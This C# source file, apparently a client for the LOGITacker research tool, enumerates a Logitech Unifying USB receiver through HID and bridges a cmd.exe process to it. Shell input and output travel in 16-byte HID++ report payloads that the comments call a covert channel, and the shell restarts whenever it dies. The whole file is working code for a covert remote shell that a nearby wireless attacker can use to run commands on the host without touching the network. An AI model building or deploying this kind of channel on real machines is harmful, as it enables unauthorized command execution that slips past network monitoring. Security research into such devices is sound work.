using System;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Threading;
using System.Collections;
using System.Collections.Generic; //for List
using System.Diagnostics;


namespace LogitackerTest
{
    public class Device
    {

        /* invalid handle value */
        public static IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        // kernel32.dll
        public const uint GENERIC_READ = 0x80000000;
        public const uint GENERIC_WRITE = 0x40000000;
        public const uint FILE_SHARE_WRITE = 0x2;
        public const uint FILE_SHARE_READ = 0x1;
        public const uint FILE_FLAG_OVERLAPPED = 0x40000000;
        public const uint OPEN_EXISTING = 3;
        public const uint OPEN_ALWAYS = 4;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPStr)] string strName, uint nAccess, uint nShareMode, IntPtr lpSecurity, uint nCreationFlags, uint nAttributes, IntPtr lpTemplate);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("hid.dll", SetLastError = true)]
        public static extern void HidD_GetHidGuid(out Guid gHid);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern bool HidD_GetPreparsedData(IntPtr hFile, out IntPtr lpData);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern bool HidD_GetAttributes(IntPtr hFile, ref HidDAttributes pAttributes);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern int HidP_GetCaps(IntPtr lpData, out HidCaps oCaps);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern bool HidD_FreePreparsedData(ref IntPtr pData);

        // setupapi.dll

        public const int DIGCF_PRESENT = 0x02;
        public const int DIGCF_DEVICEINTERFACE = 0x10;

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct DeviceInterfaceData
        {
            public int Size;
            public Guid InterfaceClassGuid;
            public int Flags;
            public IntPtr Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct DeviceInterfaceDetailData
        {
            public int Size;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 512)]
            public string DevicePath;
        }

        //We need to create a _HID_CAPS structure to retrieve HID report information
        //Details: https://msdn.microsoft.com/en-us/library/windows/hardware/ff539697(v=vs.85).aspx
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        protected struct HidCaps
        {
            public short Usage;
            public short UsagePage;
            public short InputReportByteLength;
            public short OutputReportByteLength;
            public short FeatureReportByteLength;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x11)]
            public short[] Reserved;
            public short NumberLinkCollectionNodes;
            public short NumberInputButtonCaps;
            public short NumberInputValueCaps;
            public short NumberInputDataIndices;
            public short NumberOutputButtonCaps;
            public short NumberOutputValueCaps;
            public short NumberOutputDataIndices;
            public short NumberFeatureButtonCaps;
            public short NumberFeatureValueCaps;
            public short NumberFeatureDataIndices;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct HidDAttributes
        {
            public UInt32 Size;
            public UInt16 VendorID;
            public UInt16 ProductID;
            public UInt16 VersionNumber;
        }

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern IntPtr SetupDiGetClassDevs(ref Guid gClass, [MarshalAs(UnmanagedType.LPStr)] string strEnumerator, IntPtr hParent, uint nFlags);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiEnumDeviceInterfaces(IntPtr lpDeviceInfoSet, uint nDeviceInfoData, ref Guid gClass, uint nIndex, ref DeviceInterfaceData oInterfaceData);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr lpDeviceInfoSet, ref DeviceInterfaceData oInterfaceData, ref DeviceInterfaceDetailData oDetailData, uint nDeviceInterfaceDetailDataSize, ref uint nRequiredSize, IntPtr lpDeviceInfoData);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiDestroyDeviceInfoList(IntPtr lpInfoSet);

        //public static FileStream Open(string tSerial, string tMan)
        public static FileStream Open(UInt16 vid, UInt16 pid, int report_length)
        {
            FileStream devFile = null;

            Guid gHid;
            HidD_GetHidGuid(out gHid);

            // create list of HID devices present right now
            var hInfoSet = SetupDiGetClassDevs(ref gHid, null, IntPtr.Zero, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);

            var iface = new DeviceInterfaceData(); // allocate mem for interface descriptor
            iface.Size = Marshal.SizeOf(iface); // set size field
            uint index = 0; // interface index 

            // Enumerate all interfaces with HID GUID
            while (SetupDiEnumDeviceInterfaces(hInfoSet, 0, ref gHid, index, ref iface))
            {
                var detIface = new DeviceInterfaceDetailData(); // detailed interface information
                uint reqSize = (uint)Marshal.SizeOf(detIface); // required size
                detIface.Size = Marshal.SizeOf(typeof(IntPtr)) == 8 ? 8 : 5; // Size depends on arch (32 / 64 bit), distinguish by IntPtr size

                // get device path
                SetupDiGetDeviceInterfaceDetail(hInfoSet, ref iface, ref detIface, reqSize, ref reqSize, IntPtr.Zero);
                var path = detIface.DevicePath;

                                System.Console.WriteLine("Path: {0}", path);

                // Open filehandle to device
                var handle = CreateFile(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, IntPtr.Zero);

                if (handle == INVALID_HANDLE_VALUE)
                {
                    //System.Console.WriteLine("Invalid handle");
                    index++;
                    continue;
                }

                IntPtr lpData;
                HidDAttributes pAttributes = new HidDAttributes();
                if (HidD_GetPreparsedData(handle, out lpData))
                {
                    HidCaps oCaps;
                    HidP_GetCaps(lpData, out oCaps);    // extract the device capabilities from the internal buffer
                    int inp = oCaps.InputReportByteLength;    // get the input...
                    int outp = oCaps.OutputReportByteLength;    // ... and output report length
                    HidD_FreePreparsedData(ref lpData);
                                        System.Console.WriteLine("Input: {0}, Output: {1}", inp, outp);

                    // we have report length matching our input / output report, so we create a device file in each case
                    if (inp == report_length && outp == report_length) 
                    {
                        HidD_GetAttributes(handle, ref pAttributes);

                        //Check PID&VID
                        if (pAttributes.ProductID == pid && pAttributes.VendorID == vid)
                        {
                            var shandle = new SafeFileHandle(handle, false);
                            devFile = new FileStream(shandle, FileAccess.Read | FileAccess.Write, 32, true);
                            break;

                        }

                    }

                }
                index++;
            }
            SetupDiDestroyDeviceInfoList(hInfoSet);
            return devFile;
        }
    }

    class Helper
    {
        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
    }

    class RProc {
        private Process process;
        private ProcessStartInfo processStartInfo;

        private Thread thread_out;
        private Thread thread_err;

        private System.Collections.Queue OutputQueue;

        public RProc(bool withStdErr, string filename, string args)
        {
            this.OutputQueue = Queue.Synchronized(new Queue());
            this.processStartInfo = new ProcessStartInfo(filename, args);
            this.processStartInfo.CreateNoWindow = false;

            {
                this.processStartInfo.UseShellExecute = false;
                this.processStartInfo.RedirectStandardInput = true;
                this.processStartInfo.RedirectStandardOutput = true;
                this.processStartInfo.RedirectStandardError = true;
            }

            this.process = new Process();
            this.process.StartInfo = this.processStartInfo;

            try // exception isn't thrown to the caller otherwise
            {
                this.process.Start();
            }
            finally { }

            this.thread_out = new Thread(new ThreadStart(this.OutLoop));
            thread_out.Start();

            if (withStdErr) {
                this.thread_err = new Thread(new ThreadStart(this.StderrLoop));
                thread_err.Start();
            }
       }

        public void ToStdin(byte[] data) {
            if (!this.process.HasExited)
            {
                this.process.StandardInput.BaseStream.Write(data, 0, data.Length);
                this.process.StandardInput.Flush();
            }
        }

        private void OutLoop() {
            int READ_BUFFER_SIZE = 16; //max covert channelpayload length
            byte[] readBuf = new byte[READ_BUFFER_SIZE];
            List<byte> readbufCopy = new List<byte>();

            while (!this.process.HasExited)
            {
                //This could be a CPU consuming loop if much output is produced and couldn't be delivered fast enough
                //as our theoretical maximum transfer rate is 60000 Bps we introduce a sleep when the out_queue_size exceeds 60000 bytes
                int count = this.process.StandardOutput.BaseStream.Read(readBuf, 0, readBuf.Length);

                // trim data down to count
                readbufCopy.AddRange(readBuf);

                //readbufCopy.GetRange(0, count);
                readbufCopy.RemoveRange(count, READ_BUFFER_SIZE - count);

                byte[] data = readbufCopy.ToArray();
                this.OutputQueue.Enqueue(data);

                readbufCopy.Clear();

            }
        }
        private void StderrLoop() {
            int READ_BUFFER_SIZE = 16; //max covert channelpayload length
            byte[] readBuf = new byte[READ_BUFFER_SIZE];
            List<byte> readbufCopy = new List<byte>();

            while (!this.process.HasExited)
            {
                //This could be a CPU consuming loop if much output is produced and couldn't be delivered fast enough
                //as our theoretical maximum transfer rate is 60000 Bps we introduce a sleep when the out_queue_size exceeds 60000 bytes
                int count = this.process.StandardError.BaseStream.Read(readBuf, 0, readBuf.Length);

                // trim data down to count
                readbufCopy.AddRange(readBuf);

                //readbufCopy.GetRange(0, count);
                readbufCopy.RemoveRange(count, READ_BUFFER_SIZE - count);

                byte[] data = readbufCopy.ToArray();
                this.OutputQueue.Enqueue(data);

                readbufCopy.Clear();

            }
        }

        public bool HasOut() {
            return this.OutputQueue.Count > 0;
        }

        public byte[] GetOut() {
            return (byte[]) this.OutputQueue.Dequeue();
        }

        public bool IsRunning() {
            return !this.process.HasExited;
        }
    }

    class UnifyingUSB
    {
        public FileStream hidpp_short_file;
        public FileStream hidpp_long_file;
        public FileStream dj_long_file;

        public const UInt16 VID = 0x046d;
        public const UInt16 PID = 0xc52b;

        public const UInt16 HIDPP_SHORT_LENGTH = 7;
        public const UInt16 HIDPP_LONG_LENGTH = 20;
        public const UInt16 DJ_LONG_LENGTH = 32;

        public RProc rProc;

        public UnifyingUSB()
        {
            

            this.hidpp_short_file = Device.Open(VID, PID, HIDPP_SHORT_LENGTH);
            this.hidpp_long_file = Device.Open(VID, PID, HIDPP_LONG_LENGTH);
            this.dj_long_file = Device.Open(VID, PID, DJ_LONG_LENGTH);

        }

        public void BindProcess(bool withStdErr, string procName, string procArgs) {
            if (this.rProc != null) {
                //kill old rProc
            }
            this.rProc = new RProc(withStdErr,procName,procArgs);
        }

        public void RunShell(string procName, string procArgs) {
            this.BindProcess(true, procName, procArgs);

            byte inLastSeq = 3;
            byte outSeq = 0;

            byte[] outrep = new byte[HIDPP_LONG_LENGTH];;
            outrep[0] = 0x11;
            outrep[1] = 0x03;
            outrep[2] = 0xba;
            bool outIsControlFrame = false;
            byte outControlFrameType = 0;
            byte[] outPayload = new byte[0];
            byte outPayloadLength = 0;


            while (this.rProc.IsRunning()) {

                //byte[] inrep = uu.ReadHIDInReport(false);

                byte[] inrep = new byte[UnifyingUSB.HIDPP_LONG_LENGTH];
                int l = this.hidpp_long_file.Read(inrep, 0, inrep.Length);
  

                if (inrep.Length == 20 && (inrep[2] == 0xbb || inrep[2] == 0xba)) { //ToDo: replace with full frame validation
                    //Console.WriteLine(String.Format("In  {0}", Helper.ByteArrayToString(inrep)));
                    
                    byte bitmaskIn = inrep[3];
                    byte inPaylen = (byte) ((bitmaskIn & 0xf0) >> 4);
                    byte inAck = (byte) ((bitmaskIn & 0x0c) >> 2);
                    byte inSeq = (byte) (bitmaskIn & 0x3) ;
                    byte inNextSeq = (byte) ((inLastSeq + 1) % 4);
                    bool inIsControlFrame = inrep[2] == 0xbb;
  
                    byte outAck = inLastSeq;

                    // is received report a new one ?
                    if (inSeq == inNextSeq) {
                        //New input frame (no re-transmit or invalid seq)
                        inLastSeq = inSeq;
                        outAck = inSeq;
                        //Console.WriteLine(String.Format("New input {0}", Helper.ByteArrayToString(inrep)));

                        if (inIsControlFrame && inPaylen == 0) { //paylen corresponds to control type, if control type bit is set; control type 0 is a frame with maximum payload length
                            inPaylen = 16;
                        }
                        
                        // we have to filter out packets with empty payload, which are sent in reply
                        // to update sequence numbers
                        if (inPaylen > 0) {
                            byte[] inPay = new byte[inPaylen];
                            Array.Copy(inrep, 4, inPay, 0, inPaylen);
                             Console.Write(String.Format("{0}", Encoding.UTF8.GetString(inPay)));
                             this.rProc.ToStdin(inPay);
                        }
                    }

                    //Last USB report received by device ??
                    if (inAck == outSeq) {
                        //Console.WriteLine("Last payload transmitted, ready for new one");
                        
                        outSeq = (byte) ((outSeq + 1) % 4);

                        //update payload, depending on pending data
                        if (this.rProc.HasOut()) {
                            outPayload = this.rProc.GetOut();
                            Console.Write(String.Format("{0}", Encoding.UTF8.GetString(outPayload)));
                            outPayloadLength = outPayload.Length > 16 ? (byte) 16 : (byte) outPayload.Length;

                            if (outPayloadLength == 16) {
                                outIsControlFrame = true;
                                outControlFrameType = 0x0;
                            } else {
                                outIsControlFrame = false;
                            }
                            
                        } else {
                            //Console.WriteLine("Proc has no data on stdout");
                            outIsControlFrame = false;
                            outPayloadLength = 0;
                        }
                    }


                    //update out report
                    if (outIsControlFrame) outrep[2] |= 0x01; //set control frame bit
                    else outrep[2] &= 0xfe; //unset control frame bit

                    byte bitmaskOut = outSeq;
                    bitmaskOut |= (byte) (outAck << 2);
                    bitmaskOut |= (byte) (outPayloadLength << 4);

                    if (outIsControlFrame) {
                        //replace length in bitmask field with control frame type
                        bitmaskOut &= 0x0f;
                        bitmaskOut |= (byte) (outControlFrameType << 4);


                        switch (outControlFrameType) {
                            case 0:
                                break;
                        }
                    } 
                    
                    outrep[3] = bitmaskOut;
                    Array.Copy(outPayload, 0, outrep, 4, outPayloadLength);
                    //this.WriteUSBOutputReport(outrep);
                    this.hidpp_long_file.Write(outrep, 0, outrep.Length);
                    this.hidpp_long_file.Flush();


                    //Console.WriteLine(String.Format("Out {0}", Helper.ByteArrayToString(outrep)));
                }

                // delay to avoid flooding USB report queues faster than RF is working and
                // keep room for real device communication
                Thread.Sleep(4);
            }

        }

    }

    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Start shell and wait for traffic on Unifying receiver...");
            UnifyingUSB uu = new UnifyingUSB();
            while (true) {
                uu.RunShell("cmd.exe", "");
                Console.WriteLine("Shell died ... restarting");
            }
        }

    }
}
